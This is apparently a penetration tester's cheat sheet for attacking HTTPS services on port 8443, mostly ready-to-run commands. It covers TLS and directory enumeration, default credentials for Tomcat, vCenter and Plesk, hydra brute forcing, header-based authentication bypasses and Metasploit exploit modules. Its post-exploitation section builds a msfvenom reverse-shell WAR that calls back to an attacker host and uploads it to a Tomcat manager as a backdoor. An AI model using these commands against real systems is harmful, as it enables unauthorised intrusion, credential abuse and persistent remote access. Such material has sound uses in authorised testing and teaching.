# HTTPS ALTERNATIVE ENUMERATION (Port 8443)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p8443 <IP>                             # Service/Version detection
openssl s_client -connect <IP>:8443              # SSL/TLS handshake info
curl -I https://<IP>:8443 -k                     # HTTP headers
wget --server-response --spider https://<IP>:8443 --no-check-certificate 2>&1 | grep "Server:"
nc -nv <IP> 8443                                 # Manual banner grab
```

## SSL/TLS CERTIFICATE ENUMERATION
```bash
# Get certificate details
openssl s_client -connect <IP>:8443 2>/dev/null | openssl x509 -noout -text
openssl s_client -connect <IP>:8443 -showcerts </dev/null 2>/dev/null

# Extract certificate information
openssl s_client -connect <IP>:8443 2>/dev/null | openssl x509 -noout -subject
openssl s_client -connect <IP>:8443 2>/dev/null | openssl x509 -noout -issuer
openssl s_client -connect <IP>:8443 2>/dev/null | openssl x509 -noout -dates

# Check Subject Alternative Names (SANs)
openssl s_client -connect <IP>:8443 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
nmap -p8443 --script ssl-cert <IP>
```

## SSL/TLS SECURITY TESTING
```bash
# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p8443 <IP>
sslscan <IP>:8443
sslyze --regular <IP>:8443

# SSL/TLS version testing
openssl s_client -ssl3 -connect <IP>:8443        # SSLv3
openssl s_client -tls1 -connect <IP>:8443        # TLS 1.0
openssl s_client -tls1_1 -connect <IP>:8443      # TLS 1.1
openssl s_client -tls1_2 -connect <IP>:8443      # TLS 1.2
openssl s_client -tls1_3 -connect <IP>:8443      # TLS 1.3

# Comprehensive SSL/TLS testing
testssl.sh https://<IP>:8443
testssl.sh --vulnerable https://<IP>:8443        # Vulnerability check only
```

## WEB SERVER DETECTION
```bash
# Identify application/server
whatweb https://<IP>:8443 -a 3 --no-errors       # Aggressive fingerprinting
curl -k -I https://<IP>:8443 | grep -i "server\|x-powered"

# Common applications on 8443
# - Tomcat (HTTPS)
# - Plesk control panel
# - cPanel alternative
# - VMware vCenter
# - NetScaler Gateway
# - F5 BIG-IP
# - Cisco ASA/FTD
# - Various web control panels
```

## DIRECTORY ENUMERATION
```bash
# Directory brute forcing
gobuster dir -u https://<IP>:8443 -w /usr/share/wordlists/dirb/common.txt -k -t 50
dirbuster -u https://<IP>:8443 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u https://<IP>:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt -k

# Common admin paths
/admin
/manager
/console
/portal
/vcenter
/login
/authenticate
```

## TOMCAT HTTPS ENUMERATION
```bash
# Tomcat manager (HTTPS version)
curl -k https://<IP>:8443/manager/html
curl -k https://<IP>:8443/host-manager/html
curl -k https://<IP>:8443/examples/

# Default credentials
tomcat:tomcat
admin:admin

# Tomcat brute force
hydra -L users.txt -P passwords.txt https-get://<IP>:8443/manager/html
```

## VMWARE VCENTER/ESXi ENUMERATION
```bash
# vCenter detection
curl -k https://<IP>:8443/ui                     # vSphere Client
curl -k https://<IP>:8443/vsphere-client
curl -k https://<IP>:8443/sdk                    # VMware SDK

# Version detection
curl -k https://<IP>:8443/ui/login | grep -i version
nmap -p8443 --script http-title <IP>             # Often shows version

# Default credentials
administrator@vsphere.local:VMware1!
root:vmware
admin:admin

# vCenter exploitation
searchsploit vmware vcenter
```

## CONTROL PANEL DETECTION
```bash
# Plesk
curl -k https://<IP>:8443/login_up.php           # Plesk login
curl -k https://<IP>:8443/

# cPanel alternatives
curl -k https://<IP>:8443/cpanel
curl -k https://<IP>:8443/whm

# Webmin
curl -k https://<IP>:8443/                       # Webmin might run here
```

## API ENDPOINT DISCOVERY
```bash
# Common API paths
curl -k https://<IP>:8443/api
curl -k https://<IP>:8443/api/v1
curl -k https://<IP>:8443/rest/v1
curl -k https://<IP>:8443/swagger.json
curl -k https://<IP>:8443/api-docs
curl -k https://<IP>:8443/openapi.json

# VMware API
curl -k https://<IP>:8443/rest/com/vmware
curl -k https://<IP>:8443/api/vcenter
```

## VULNERABILITY SCANNING
```bash
# Nikto scan
nikto -h https://<IP>:8443 -ssl                  # HTTPS scan

# Nmap vulnerability scripts
nmap -p8443 --script "ssl-* and http-vuln-*" <IP>
nmap -p8443 --script vuln <IP>

# SSL/TLS vulnerabilities
nmap -p8443 --script ssl-heartbleed <IP>         # Heartbleed
nmap -p8443 --script ssl-poodle <IP>             # POODLE
testssl.sh --vulnerable https://<IP>:8443        # All SSL vulns
```

## HTTP METHODS TESTING
```bash
# Enumerate allowed methods
nmap -p8443 --script http-methods --script-args http-methods.url-path=/manager/html <IP>
curl -k -X OPTIONS https://<IP>:8443 -v

# Test dangerous methods
curl -k -X PUT https://<IP>:8443/test.txt -d "content"
curl -k -X DELETE https://<IP>:8443/test.txt
curl -k -X TRACE https://<IP>:8443
```

## AUTHENTICATION BYPASS ATTEMPTS
```bash
# Header-based bypass
curl -k https://<IP>:8443/admin -H "X-Forwarded-For: 127.0.0.1"
curl -k https://<IP>:8443/admin -H "X-Real-IP: 127.0.0.1"
curl -k https://<IP>:8443/admin -H "Host: localhost"

# Path traversal
curl -k https://<IP>:8443/admin/..;/
curl -k https://<IP>:8443/./admin
```

## CLIENT CERTIFICATE TESTING
```bash
# Check if client certificates required
curl -k https://<IP>:8443
curl -k --cert client.pem https://<IP>:8443

# Test with client certificate
openssl s_client -connect <IP>:8443 -cert client.crt -key client.key
```

## INTERESTING FILES
```bash
# Common interesting files
curl -k https://<IP>:8443/robots.txt
curl -k https://<IP>:8443/sitemap.xml
curl -k https://<IP>:8443/web.xml
curl -k https://<IP>:8443/WEB-INF/web.xml
curl -k https://<IP>:8443/.git/config
curl -k https://<IP>:8443/.env
curl -k https://<IP>:8443/config.php
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/ssl_version           # SSL version scanner
use auxiliary/scanner/http/tomcat_mgr_login      # Tomcat login
use exploit/multi/http/tomcat_mgr_upload         # Tomcat upload
use auxiliary/scanner/vmware/vcenter_version     # vCenter version
use exploit/linux/http/vcenter_vmdir_ldap        # vCenter LDAP exploit
```

## SUBDOMAIN/VHOST DISCOVERY
```bash
# Virtual host brute forcing
gobuster vhost -u https://<IP>:8443 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k
ffuf -u https://<IP>:8443 -H "Host: FUZZ.<domain>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k
```

## DEFAULT CREDENTIALS TESTING
```bash
# Common defaults for 8443
admin:admin
admin:password
administrator:VMware1!
root:vmware
tomcat:tomcat
plesk:changeme
test:test

# Automated testing
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt https-get://<IP>:8443
```

## COMMON MISCONFIGURATIONS
```
☐ Self-signed certificate                       # Development environment
☐ Default credentials active                     # Easy access
☐ Admin interface exposed                        # Attack surface
☐ Weak SSL/TLS configuration                     # Cryptographic attacks
☐ SSLv3/TLS1.0 enabled                          # Outdated protocols
☐ Directory listing enabled                      # Info disclosure
☐ Verbose error messages                         # Info leakage
☐ Missing security headers                       # XSS, clickjacking
☐ Outdated software version                      # Known vulnerabilities
☐ HTTP methods enabled (PUT, DELETE)            # File manipulation
```

## QUICK WIN CHECKLIST
```
☐ Test default credentials
☐ Check for Tomcat manager interface
☐ Check for VMware vCenter
☐ Test for Heartbleed (old OpenSSL)
☐ Check SSL/TLS configuration (SSLv3, weak ciphers)
☐ Directory enumeration
☐ Check certificate SANs for additional domains
☐ Test for common control panels (Plesk, cPanel)
☐ Nikto vulnerability scan
☐ Check for API endpoints
☐ Test authentication bypass techniques
☐ Search for known exploits (searchsploit)
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p8443 --script "ssl-* and http-*" -oA https_8443_enum <IP>

# Quick SSL/TLS check
testssl.sh --fast https://<IP>:8443

# Fast directory scan
gobuster dir -u https://<IP>:8443 -w /usr/share/wordlists/dirb/common.txt -k -t 50 -q
```

## POST-EXPLOITATION
```bash
# After vCenter access
# Enumerate VMs, networks, credentials
# Deploy malicious VM
# Access ESXi hosts

# After Tomcat manager access
# Deploy WAR backdoor
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war > shell.war
curl -k -u admin:admin --upload-file shell.war https://<IP>:8443/manager/text/deploy?path=/shell
```

## ADVANCED TECHNIQUES
```bash
# SNI enumeration
openssl s_client -connect <IP>:8443 -servername <domain>

# Check for HTTP/2 support
curl -k -I --http2 https://<IP>:8443
nghttp -nv https://<IP>:8443

# OCSP stapling
openssl s_client -connect <IP>:8443 -status 2>/dev/null | grep -A17 "OCSP"

# Session resumption
openssl s_client -connect <IP>:8443 -reconnect 2>/dev/null | grep "Session-ID"
```
